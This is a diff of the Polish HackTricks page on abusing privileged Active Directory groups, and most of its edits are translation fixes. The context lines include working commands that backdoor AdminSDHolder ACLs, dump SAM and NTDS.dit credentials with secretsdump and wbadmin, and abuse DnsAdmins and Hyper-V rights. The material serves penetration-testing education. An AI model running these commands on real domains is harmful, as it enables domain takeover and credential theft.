@@ -9,8 +9,8 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 <summary>Wsparcie dla HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
@@ -40,7 +40,7 @@ Dodawanie nowych użytkowników jest dozwolone, a także lokalne logowanie do DC
 
 ## Grupa AdminSDHolder
 
-Lista Kontroli Dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustala uprawnienia dla wszystkich "chronionych grup" w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.
+Lista Kontroli Dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustala uprawnienia dla wszystkich "chronionych grup" w Active Directory, w tym grup o wysokich uprawnieniach. Ten mechanizm zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.
 
 Atakujący mógłby to wykorzystać, modyfikując ACL grupy **AdminSDHolder**, przyznając pełne uprawnienia standardowemu użytkownikowi. To skutecznie dałoby temu użytkownikowi pełną kontrolę nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny z powodu konstrukcji systemu.
 
@@ -50,11 +50,11 @@ Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+Dostępny jest skrypt, który przyspiesza proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
 
-For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+Aby uzyskać więcej informacji, odwiedź [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
 
-## AD Recycle Bin
+## Kosz AD
 
 Członkostwo w tej grupie umożliwia odczyt usuniętych obiektów Active Directory, co może ujawnić wrażliwe informacje:
 ```bash
@@ -74,7 +74,7 @@ To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia
 
 ## Backup Operators
 
-Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Uprawnienia te umożliwiają przechodzenie przez foldery, wyświetlanie listy oraz kopiowanie plików, nawet bez wyraźnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Wykorzystanie określonych skryptów jest konieczne w tym procesie.
+Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Uprawnienia te umożliwiają przechodzenie przez foldery, wyświetlanie listy oraz kopiowanie plików, nawet bez wyraźnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Wykorzystanie konkretnych skryptów jest konieczne w tym procesie.
 
 Aby wyświetlić członków grupy, wykonaj:
 ```powershell
@@ -135,7 +135,7 @@ reg save HKLM\SAM SAM.SAV
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-#### Używanie wbadmin.exe
+#### Using wbadmin.exe
 
 1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zbuforuj poświadczenia SMB na maszynie docelowej.
 2. Użyj `wbadmin.exe` do tworzenia kopii zapasowej systemu i ekstrakcji `NTDS.dit`:
@@ -146,11 +146,11 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Aby zobaczyć praktyczną demonstrację, zobacz [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
 
 ## DnsAdmins
 
-Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnego DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Ta zdolność pozwala na znaczny potencjał do eksploatacji.
+Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Ta zdolność pozwala na znaczny potencjał do eksploatacji.
 
 Aby wyświetlić członków grupy DnsAdmins, użyj:
 ```powershell
@@ -189,7 +189,7 @@ For more details on this attack vector, refer to ired.team.
 Możliwe jest również użycie mimilib.dll do wykonania poleceń, modyfikując go w celu wykonania konkretnych poleceń lub odwrotnych powłok. [Sprawdź ten post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) po więcej informacji.
 
 ### WPAD Record for MitM
-DnsAdmins mogą manipulować rekordami DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokad zapytań. Narzędzia takie jak Responder lub Inveigh mogą być używane do spoofingu i przechwytywania ruchu sieciowego.
+DnsAdmins mogą manipulować rekordami DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokad zapytań. Narzędzia takie jak Responder lub Inveigh mogą być używane do fałszowania i przechwytywania ruchu sieciowego.
 
 ### Event Log Readers
 Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajdując wrażliwe informacje, takie jak hasła w postaci czystego tekstu lub szczegóły wykonania poleceń:
@@ -198,7 +198,7 @@ Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajd
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Uprawnienia Windows Exchange  
+## Uprawnienia Windows Exchange
 Ta grupa może modyfikować DACL na obiekcie domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę są szczegółowo opisane w repozytorium Exchange-AD-Privesc na GitHubie.
 ```powershell
 # List members
@@ -208,7 +208,7 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 Administratorzy Hyper-V mają pełny dostęp do Hyper-V, co może być wykorzystane do przejęcia kontroli nad wirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie aktywnych kontrolerów domeny i wydobywanie skrótów NTLM z pliku NTDS.dit.
 
 ### Przykład wykorzystania
-Usługa konserwacyjna Mozilli Firefox może być wykorzystywana przez administratorów Hyper-V do wykonywania poleceń jako SYSTEM. Polega to na utworzeniu twardego linku do chronionego pliku SYSTEM i zastąpieniu go złośliwym plikiem wykonywalnym:
+Usługa konserwacyjna Mozilla Firefox może być wykorzystywana przez administratorów Hyper-V do wykonywania poleceń jako SYSTEM. Polega to na utworzeniu twardego linku do chronionego pliku SYSTEM i zastąpieniu go złośliwym plikiem wykonywalnym:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
@@ -218,21 +218,21 @@ Note: Wykorzystanie twardych linków zostało złagodzone w ostatnich aktualizac
 
 ## Zarządzanie Organizacją
 
-W środowiskach, w których zainstalowany jest **Microsoft Exchange**, specjalna grupa znana jako **Zarządzanie Organizacją** ma znaczące uprawnienia. Grupa ta ma prawo **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** i utrzymuje **pełną kontrolę nad jednostką organizacyjną 'Microsoft Exchange Security Groups'** (OU). Kontrola ta obejmuje grupę **`Exchange Windows Permissions`**, która może być wykorzystana do eskalacji uprawnień.
+W środowiskach, w których zainstalowano **Microsoft Exchange**, specjalna grupa znana jako **Zarządzanie Organizacją** posiada znaczące uprawnienia. Ta grupa ma przywilej **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** i utrzymuje **pełną kontrolę nad jednostką organizacyjną 'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, która może być wykorzystana do eskalacji uprawnień.
 
 ### Wykorzystanie Uprawnień i Polecenia
 
 #### Operatorzy Drukarek
 Członkowie grupy **Operatorzy Drukarek** mają przyznane kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **logować się lokalnie do kontrolera domeny**, wyłączać go i zarządzać drukarkami. Aby wykorzystać te uprawnienia, szczególnie jeśli **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższonych uprawnień, konieczne jest ominięcie Kontroli Konta Użytkownika (UAC).
 
-Aby wyświetlić członków tej grupy, używa się następującego polecenia PowerShell:
+Aby wylistować członków tej grupy, używa się następującego polecenia PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Dla bardziej szczegółowych technik eksploatacji związanych z **`SeLoadDriverPrivilege`**, należy skonsultować się z konkretnymi zasobami bezpieczeństwa.
 
 #### Użytkownicy pulpitu zdalnego
-Członkowie tej grupy mają przyznany dostęp do komputerów za pośrednictwem protokołu pulpitu zdalnego (RDP). Aby wyliczyć tych członków, dostępne są polecenia PowerShell:
+Członkowie tej grupy mają dostęp do komputerów za pośrednictwem protokołu pulpitu zdalnego (RDP). Aby wylistować tych członków, dostępne są polecenia PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
@@ -240,12 +240,12 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych zasobach pentestingowych.
 
 #### Użytkownicy zdalnego zarządzania
-Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Wykrywanie tych członków osiąga się poprzez:
+Członkowie mogą uzyskiwać dostęp do komputerów za pomocą **Windows Remote Management (WinRM)**. Wykrywanie tych członków osiąga się poprzez:
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Dla technik eksploatacji związanych z **WinRM** należy skonsultować się z odpowiednią dokumentacją.
+Dla technik eksploatacji związanych z **WinRM**, należy skonsultować się z odpowiednią dokumentacją.
 
 #### Operatorzy serwera
 Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia kopii zapasowych i przywracania, zmiany czasu systemowego oraz wyłączania systemu. Aby wylistować członków, należy użyć następującego polecenia:
@@ -285,7 +285,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 <summary>Wsparcie dla HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
